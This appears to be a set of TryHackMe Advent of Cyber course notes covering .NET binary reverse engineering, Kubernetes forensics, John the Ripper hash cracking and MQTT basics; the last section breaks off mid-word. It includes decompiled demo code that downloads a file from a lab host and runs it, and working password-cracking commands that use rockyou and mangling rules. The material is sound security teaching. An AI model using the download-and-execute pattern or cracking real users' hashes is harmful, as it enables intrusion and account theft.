- **Import/Export tables:** These tables reference additional libraries used (imported) or exported by the binary. Binaries often rely on libraries to perform functions. For example, interacting with the Windows API to manipulate files

The binaries in today's task follow the PE structure. This structure will be explained throughout the task.

## Disassembly Vs. Decompiling

When reverse engineering binaries, you will employ two primary techniques. This task section will introduce you to disassembly and decompiling, explaining the key differences and their pros and cons.

Disassembling a binary shows the low-level machine instructions the binary will perform (you may know this as assembly). Because the output is translated machine instructions, you can see a detailed view of how the binary will interact with the system at what stage. Tools such as IDA, Ghidra, and GDB can do this.

![disassembling a binary](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1729849249700.png)  

Decompiling, however, converts the binary into its high-level code, such as C++, C#, etc., making it easier to read. However, this translation can often lose information such as variable names. This method of reverse engineering a binary is useful if you want to get a high-level understanding of the application's flow.

![Decompiling using ILSpy](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1729849283353.png)  

There are specific circumstances where you would choose one method over the other. For example, decompiling is sometimes a "best guess" based on the tooling you've used and does not provide the actual full source code.

A table outlining the key differences between the two has been provided below.

|   |   |   |
|---|---|---|
|**Comparison**|**Disassembly**|**Decompiling**|
|**Readability**|Requires knowing assembly and low-level knowledge of computing concepts.|Requires familiarity with programming and logic|
|**Level of output**|The translated output is the exact instructions that the machine will perform.|The translated output is often a "best guess". The output may not be accurate, and useful information, such as variables, function names, etc, will likely be lost.|
|**Difficulty**|The difficulty can be considered higher as the machine instructions are translated into assembly.|The machine instructions are translated into a high-level language, which makes them easier to understand if you are familiar with the language the binary is written in.|
|**Usefulness**|The entire behaviour of the binary can be studied given enough time.|Decompiling is a quick way to understand some of the logic of the binary.|

## Multi-Stage Binaries

Recent trends in cyber security have seen the rise of attackers using what's known as "Multi-stage binaries" in their campaigns - especially malware. These attacks involve using multiple binaries responsible for different actions rather than one performing the entire attack. Usually, an attack involving various binaries will look like the following:

1. **Stage 1 - Dropper:** This binary is usually a lightweight, basic binary responsible for actions such as enumerating the operating system to see if the payload will work. Once certain conditions are verified, the binary will download the second - much more malicious - binary from the attacker's infrastructure.
2. **Stage 2 - Payload:** This binary is the "meat and bones" of the attack. For example, in the event of ransomware, this payload will encrypt and exfiltrate the data.

Sophisticated attackers may further split actions of the attack chain (e.g., lateral movement) into additional binaries. Using multiple stages helps evade detection and makes the analysis process more difficult.

For example, a small, more "harmless" initial binary is likelier to evade detection via email filtering than a fully-fledged binary that performs malicious actions such as encryption. Additionally, splitting these functions into multiple stages gives the attacker much more control (i.e. only downloading specific stages once conditions such as time have been met).

The diagram below shows what an attack involving multiple staged binaries may look like.

![Depicting the stages of a multi-stage binary. At first there is an entry point such as from a phishing email, then an initial dropper which executes a downloader containing the malware](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732167874084.png)

## Jingle .NET all the way

For today's task, you will be reverse engineering two .NET binaries using the decompiler ILSpy. You can follow the walkthrough below in reverse engineering using an example application named `demo.exe`. Then, you will reverse an application on your own at the end of this task.

Before analysing our target, we need to learn and find a way to identify the original binary file, modify it, or use it as evidence. Also, it is good practice to have a big picture of the file we are dealing with so that we can choose the proper tools we will need.

Let's start by navigating to the file location in the **demo** folder on the machine's Desktop by right-clicking on the file named **demo** and clicking on `Properties`.

![clicking on properties option](https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729800848396.png)  

We can observe that the file's extension is .exe, indicating that it is a Windows executable.

![checking properties of demo.exe](https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729642810578.png)  

Since it's a Windows file, we'll use [PEStudio](https://www.winitor.com/download), a software designed to investigate potentially malicious files and extract information from them without execution. This will help us focus on the static analysis side of the investigation. Let's open PEstudio from the taskbar and then click on  **File** > **Open** and select the file `demo.exe` located in `C:\Users\Administrator\Desktop\demo\demo.exe` as shown below.

![opening file in PEStuido](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732169586145.png)  

As shown below, PEStudio will display information about the file, so let's start enumerating some of the most important aspects we can get from it. Using the left panel, we can navigate through different sections that will share different types of information about the file. In the general information output displayed when opening the file, we can see the hash of the file in the form of **SHA-256**, The architecture type, in this case, **x64**, the file type, and the signature of the language used to compile the executable, in this case, .**NET framework** that uses the C# language.

![analysing headers in PEStudio](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732169775728.png)  

Let's focus on some critical data we can obtain. First, if we want to identify the file and provide evidence of its alteration, we need to take note of the file’s SHA-256 hash, as we mentioned above, as well as the hash of each section on the PE file. PE stands for Portable Executable, and it's the format in which Windows executables are arranged; you can learn more about it [here](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format). 

[The sections](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-table-section-headers) represent a memory space with different content of the Windows executable within the PE format. We can calculate the hash of these sections in order to identify the executable properly. We'll focus this time on two hashes: the one from the [.text](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#:~:text=in%20that%20module.-,.text,Executable%20code%20(free%20format),-IMAGE_SCN_CNT_CODE%20%7C%20IMAGE_SCN_MEM_EXECUTE%20%7C%20IIMAGE_SCN_MEM_READ) section, which is the section on the file containing the executable code; this section is often marked as Read and executable, so it should not have any alterations when the file is being copied. We can observe them in the screenshot below:

![checking sections in PEStudio](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732169883274.png)  

Another essential section we can use to obtain information about the binary is the "indicators" section. This section tells us about the potential indicators like URLs or other suspicious attributes of a binary.

![Checking Strings in PEStudio](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732170189213.png)

The screenshot above shows several strings on the file, like file names, URLs, and function names. This can be very important depending on the file's execution flow. Additionally, looking for artefacts such as IP addresses, URLs, and crypto wallets can be a "quick win" for gathering some identifying intelligence. We'll learn about that in the next section.

Now that we have information about the file we are investigating, let's try to understand what the executable is doing. We need to understand its flow. If we try to read the file by opening it, we cannot do it since it's in binary format. In the previous section, we learned that the file is compiled using the `.NET` framework used by the `C#` language; we can decompile the binary code into C# using a decompilation tool like [ILSpy](https://github.com/icsharpcode/ILSpy).

This tool will decompile the code, providing us with readable information we can use to determine the flow of execution. Let's start by opening ILSpy from the taskbar and then click on `File > Open` and then navigate to `C:\Users\Administrator\Desktop\demo` and select the file `demo.exe`. The tool `ILSpy` may take up to 30 seconds to appear on the screen.

![Opening file in ILSpy](https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729645613616.png)

As we can observe from above, the left panel contains the libraries used by the framework, and the actual decompiled code is in the section with the file name **demo**. Let's click on it to expand and see what it contains.

![checking code in ILSpy](https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729797176418.png)

As the screenshot above shows, ILSpy can provide much information, like metadata and references. However, the actual show is displayed on the brackets symbols {}, in this case, under `DemoBinary > Program > Main`, which is actually the Main function of the executable. Now that we have access to the code running on the binary, let's analyse it.

```csharp
private static void Main(string[] args)
{
	Console.WriteLine("Hello THM DEMO Binary");
	Thread.Sleep(5000);
	string address = "http://10.10.10.10/img/tryhackme_connect.png";
	string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "thm-demo.png");
	using (WebClient webClient = new WebClient())
	{
		try
		{
			Console.WriteLine("Downloading file...");
			webClient.DownloadFile(address, text);
			Console.WriteLine("File downloaded to: " + text);
			Process.Start(new ProcessStartInfo(text)
			{
				UseShellExecute = true
			});
			Console.WriteLine("Image opened successfully.");
		}
		catch (Exception ex)
		{
			Console.WriteLine("An error occurred: " + ex.Message);
		}
	}
	Console.WriteLine("Bye Bye leaving Demo Binary");
	Thread.Sleep(5000);
}
```

The code above displays the main function and its code. We can observe that first, it prints to the screen the message "Hello THM DEMO Binary" using the [Console.Writeline method](https://learn.microsoft.com/en-us/dotnet/api/system.console.writeline?view=net-8.0).

```csharp
Console.WriteLine("Hello THM DEMO Binary");
```

It then uses the [Sleep](https://learn.microsoft.com/en-us/dotnet/api/system.threading.thread.sleep?view=net-8.0) method to wait for 5 seconds.

```csharp
Thread.Sleep(5000);
```

Then, it assigns a value to two string variables: address and text, the first one with a URL accessing a PNG file, and the second one with a file name on the user's Desktop named **thm-demo.png**.

```csharp
string address = "http://10.10.10.10/img/tryhackme_connect.png";
string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "thm-demo.png");
```

Then, it will try to connect to the URL on the **address** variable and save the content to a file on the Desktop using the [WebClient class](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-8.0), and it will then execute the downloaded file path assigned to the **text** variable using the [Process class](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=net-8.0)  and the [Start method](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=net-8.0#system-diagnostics-process-start(system-string)), as displayed below.

```csharp
using (WebClient webClient = new WebClient())
	{
		try
		{
			Console.WriteLine("Downloading file...");
			webClient.DownloadFile(address, text);
			Console.WriteLine("File downloaded to: " + text);
			Process.Start(new ProcessStartInfo(text)
			{
				UseShellExecute = true
			});
			Console.WriteLine("Image opened successfully.");
		}
		catch (Exception ex)
		{
			Console.WriteLine("An error occurred: " + ex.Message);
		}
	}
```

Finally, it prints the message "**Bye Bye, leaving THM DEMO Binary**" again to the console and waits for 5 seconds using the **Sleep** method before closing.

```csharp
	Console.WriteLine("By bye leaving THM Demo Binary");
	Thread.Sleep(5000);
```

Great! We now understand what the binary is doing. It will download a PNG file to the user's Desktop from the URL: `http://10.10.10.10/img/tryhackme_connect.png`. Let's execute the file and see if this is true. Once the binary starts, wait for the text "`Hello THM DEMO Binary`" to appear, then press `Enter` to download the file.

**Note**: _We are only executing the binary because we are in a sandbox environment; execution of an unknown binary on a host machine is NOT recommended._

![Opening file in Paint](https://tryhackme-images.s3.amazonaws.com/user-uploads/66264cef7bba67a6bbbe7179/room-content/66264cef7bba67a6bbbe7179-1729799008710.png)

After executing the file, we can observe that it was downloaded to the Desktop, and the messages print to the screen as expected. Also, the downloaded file is executed and opened using the default app for PNG **Paint**. Excellent, we successfully Reverse-Engineered the flow of the code.


# Day 22 Kubernetes
## Kubernetes Explained

Back in the day, it was very common for companies/organisations to use a monolithic architecture when building their applications. A monolithic architecture is an application built as a single unit, a single code base, and usually, a single executable deployed as a single component. For many companies, this worked and still does to this day; however, for some companies, this style of architecture was causing problems, especially when it came to scaling. The problem with monolithic applications is that if one single part of the application needs scaling, the whole application has to be scaled with it. It would make far more sense for companies with applications that receive fluctuating levels of demand across their parts to break the application down component by component and run them as their own microservices. That way, if one "microservice" starts to receive an increase in demand, it can be scaled up rather than the entire application.

**The Great Microservice Adoption**

Microservices architecture was adopted by companies like Netflix, which is a perfect example of the hypothetical company discussed above. Their need to scale up services dedicated to streaming when a new title is released (whilst services dedicated to user registration, billing, etc, won't need the same scaling level) made a microservices architecture a no-brainer. As time went by, companies similar to Netflix hopped aboard the Microservices Express, and it became very widely adopted. Now, as for the hosting of these microservices, containers were chosen due to their lightweight nature. Only as you may imagine, an application of this scale can require hundreds, even thousands of containers. Suddenly, a tool was needed to organise and manage these containers.

**Introducing Kubernetes**

Well, you guessed it! That's exactly what Kubernetes was made for. Kubernetes is a container orchestration system. Imagine one of those microservices mentioned earlier is running in a container, and suddenly, there is an increase in traffic, and this one container can no longer handle all requests. The solution to this problem is to have another container spun up for this microservice and balance the traffic between the two. Kubernetes takes care of this solution for you, "orchestrating" those containers when needed.

That makes things a lot easier for everyone involved, and it's because of this (along with the widespread adoption of microservices architecture) that Kubernetes is so ubiquitous in the digital landscape today. This popularity means that it's **highly portable** as no matter what technology stack is being used, it's very likely a Kubernetes integration is available; this, along with the fact it can help make an application **highly available** and **scalable**, makes Kubernetes a no-brainer!

In Kubernetes, containers run in **pods**; these pods run on **nodes**, and a collection of nodes makes up a Kubernetes **cluster**. It is within a cluster that McSkidy and co's investigation will occur today. If you're interested in learning more about Kubernetes, we have a range of rooms on the subject. A good place to start would be the [Intro to Kubernetes](https://tryhackme.com/r/room/introtok8s) room; then, there's plenty more where that came from with the [Kubernetes Hardening](https://tryhackme.com/module/kubernetes-hardening) Module.  

## DFIR Basics

Every cyber security professional has stumbled—or will stumble—upon **DFIR** at some point in their career. It is an acronym—in IT, we all _love_ our acronyms—that stands for "**Digital Forensics and Incident Response**." These two investigative branches of cyber security come into play during a cyber security incident. A DFIR expert will likely be called to action as soon as an incident is ascertained and will be expected to perform actions that fall into one or both of the two disciplines:

- **Digital Forensics**, like any other "forensics" discipline, aims to collect and analyse digital evidence of an incident. The artefacts collected from the affected systems are used to trace the chain of attack and uncover all facts that ultimately led to the incident. DFIR experts sometimes use the term "post-mortem" to indicate that their analysis starts _after_ the incident has occurred and is performed on already compromised systems and networks.
- **Incident Response**, while still relying on data analysis to investigate the incident, focuses on "responsive" actions such as threat containment and system recovery. The incident responder will isolate infected machines, use the data collected during the analysis to identify the "hole" in the infrastructure's security and close it, and then recover the affected systems to a clean, previous-to-compromise state.

Picture the incident responder as an emergency first responder whose aim is to contain the damage, extinguish the fire, and find and stabilise all the victims. On the other hand, the digital forensics analyst is the Crime Scene Investigator (CSI) or detective trying to recreate the crime scene and ultimately find evidence to identify and frame the criminal.

Both roles are expected to document all findings thoroughly. The incident responder will present them to explain how the incident happened and what can be learnt from it, ultimately proposing changes to improve the security stance of the entity affected by the incident. The digital forensics analyst will use the findings to demonstrate the attackers' actions and—eventually—testify against them in court.

In the task at hand, we will help McSkidy and the Glitch become digital forensics analysts and retrace the malicious actor's steps. We will especially focus on collecting evidence and artefacts to uncover the perpetrator and present our analysis to Wareville townspeople.

![McSkidy and The Glitch in detective and firefighter costumes](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730813333189.png)  

## Excruciatingly Ephemeral

DFIR can be a lot of fun. It's easy to feel like a digital detective, analysing the crime scene and connecting the dots to create a narrative string of events explaining what happened. What if the crime scene vanished into thin air moments after the crime was committed? That is a problem we face regularly when carrying out DFIR in a Kubernetes environment. This is because, as mentioned, Kubernetes workloads run in containers. It is **very** common that a container will have a very short lifespan (either spun up to run a job quickly or to handle increased load, etc, before being spun back down again). In fact, in this year's (2024) [Cloud-Native Security and Usage Report](https://sysdig.com/2024-cloud-native-security-and-usage-report/), Sysdig found that 70% of containers live less than 5 minutes.

So what can we do about it? Well not to worry, it just means we have to expand our digital detectives toolkit. The key to keeping track of the ongoings in your often ephemeral workloads within your Kubernetes environment is increasing **visibility**. There are a few ways we can do this. One way is by enabling Kubernetes audit logging, a function that Kubernetes provides, allowing for requests to the API to be captured at various stages. For example, if a user makes a request to delete a pod, this request can be captured, and while the pod will be deleted (and logs contained within it lost), the request made to delete it will be persisted in the audit logs. What requests/events are captured can be defined with an audit policy. We can use these audit logs to answer questions which help us in a security/DFIR context, such as:

- What happened?
- When did it happen?
- Who initiated it?
- To what did it happen?
- Where was it observed?
- From where was it initiated?
- To where was it going?

Of course, this just scratches the surface in terms of the level of visibility we can achieve in our Kubernetes environment. We can feed these audit logs, as well as events from other security-relevant sources, into runtime security tools which help transform these raw events into actionable data (which can then be visualised using yet more tools; a digital detective should definitely invest in an **extra large** toolkit). If you want to learn more on that subject, check out the [Kubernetes Runtime Security](https://tryhackme.com/r/room/k8sruntimesecurity) room.

# Day 23 Hash Cracking
## Hashed Passwords

Before we dive further, it is helpful to learn how passwords are saved in authentication systems. A long time ago, before security was a “thing”, passwords were stored in cleartext along with the associated username. When the user tries to log in, the system compares the provided password for this account with the saved one. Consequently, if a user forgets their password, someone with enough access privileges can look at the table and respond with something like, “The password for `joebloggs` is `ASDF1234`.” This was a terrible idea, especially since a database can be stolen and its content leaked online. Unfortunately, users tend to use the same password for different services. Consequently, if an adversary discovers Joe Bloggs’s password from another service, they will try it on Joe’s other accounts, such as email.

To protect passwords, even in the case of a data breach, companies started to save a hashed version of the password. For that, we need to use a hash function. A hash function takes an input of any size and returns a fixed size value. For example, SHA256 (Secure Hash Algorithm 256) creates a 256-bit hash value. In other words, `sha256sum FILE_NAME` will return a 256-bit hash value regardless of whether the input file is a few bytes or several gigabytes. In the terminal below, we demonstrate this with one file being 2.3 gigabytes and another being 13 bytes.

Next, we will try passwords from rockyou.txt, a popular password wordlist from a real data breach. The command is as follows:

john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt

    john starts John the Ripper; the jumbo edition is installed on the machine
    --format=raw-sha256 specifies the hash format, which we have figured out earlier that it is most likely a SHA-256
    --wordlist=/usr/share/wordlists/rockyou.txt sets the wordlist that we will use
    hash1.txt is the text file containing the hash value we are trying to crack

In our first attempt, john calculated the SHA-256 hash value for every password in rockyou.txt and compared it with the hash value in hash1.txt. Unfortunately, no password was found, as shown in the terminal output below:
VM Terminal

         
user@machine:~/AOC2024$ john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:03 DONE (2024-11-03 09:49) 0g/s 4765Kp/s 4765Kc/s 4765KC/s (4510458faruk)..*7¡Vamos!
Session completed.

        

There is a high chance that Mayor Malware has made some transformation to his password. For example, he might have replaced a with 4 or added a couple of digits to his password. John can start from a long password list and attempt various common derivations from each of the passwords to increase its chances of success. This behaviour can be triggered through the use of rules. Various rules come bundled with John the Ripper’s configuration files; one is suited for lengthy wordlists, --rules=wordlist.

Adding the option --rules=wordlist to your john command line generates multiple passwords from each one. For instance, it appends and prepends single digits. It does various common substitutions; for example, a can be replaced with @, i can be replaced with !, and s can be replaced with $. Many more mutations and transformations are part of these rules. You can check all the underlying rules by checking the [List.Rules:Wordlist] section in /etc/john/john.conf, John’s configuration file. Unlike the first attempt, using John with this option should crack the hash for you:
john --format=raw-sha256 --rules=wordlist --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt

We should note that john will not spend computing resources to crack an already-cracked password hash. Consequently, if you repeat a command that has successfully found a password earlier, you will get a message like “No password hashes left to crack (see FAQ)”. Let’s say that you executed the command listed above and you recovered the password; then, the next time you want to see that password, you would use john with the --show option, for example, john --format=raw-sha256 --show hash1.txt.


# Day 24 Communication Protocols

## How Smart is Smart

Smart devices make our lives very easy. We no longer physically need to move and turn on or off a switch to control them. With smart HVAC systems, we can maintain the temperature of our homes and ensure they are not too cold or too hot when we come home from outside. Smart vacuum cleaners can clean our house while we work on other things or go out for dinner. Many smart devices come with apps that allow us to control them using our mobile phones. Even better, since these devices can be controlled remotely through apps and interfaces connected to the Internet, we can make their designs more minimalistic and aesthetically independent, and the need for adding switches or controls on the device itself is minimized.

## Is It Smart

While they make our lives easier, most smart devices need a network connection to provide control to the users. Many smart devices are connected over the Internet (hence the term Internet of Things or IoT), which, from a security point of view, means that anyone can potentially take control of these devices. We can limit the exposure of these devices by adding security controls such as network isolation and authentication mechanisms. Still, if we fail to do so, the results can be catastrophic. However, the most secure system is a system that is shut down, but that does not deter us from using different systems to help us out in our daily lives, and the same should be the case with smart devices. Instead, we can ensure that we understand how our smart devices work and have adequate security set up for them.

![a map of devices connecting together, zooming out to a globe showing communication between different geographical areas](https://assets.tryhackme.com/additional/aoc2024/gifs/AoC Day 24 - Reverse engineering animation.gif)

## The Language of IoT

Although different IoT and smart devices use various programming languages, depending on the platform and vendor, they often need to speak the same language to be able to communicate with each other. For example, while IoT devices might use C++ or Java to talk to the compiler and the underlying hardware, they will need a language like HTTP or MQTT to talk with your system or mobile device.

## How to Speak MQTT

MQTT stands for Message Queuing Telemetry Transport. It is a language very commonly used in IoT devices for communication purposes. It works on a publish/subscribe model, where any client device can publish messages, and other client devices can subscribe to the messages if they are related to a topic of interest. An MQTT broker connects the different clients, publishing and subscribing to messages.

![MQTT example network](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1732161467165.png)

To further understand MQTT, let’s explore some key concepts used in MQTT protocols.

**MQTT Clients:** MQTT clients are IoT devices, such as sensors and controllers, that publish or subscribe to messages using the MQTT protocol. For example, a temperature sensor can be a client that publishes temperature sensors at different places. An HVAC controller can also act as a client that subscribes to messages from the temperature sensor and turns the HVAC system on or off based on the input received.

**MQTT Broker:** An MQTT broker receives messages from publishing clients and distributes them to the subscribing clients based on their preferences.

**MQTT Topics:** Topics are used to classify the different types of messages. Clients can subscribe to messages based on their topics of interest. For example, a temperature sensor sending temperature readings can use the topic of “room temperature”, while an HVAC controller would subscribe to messages under the topic of “room temperature”. However, a light sensor can publish messages with the topic “light readings”. An HVAC controller does not need to subscribe to this topic. On the other hand, a light controller would subscribe to “light readings” but not to the topic of “room temperature”.mq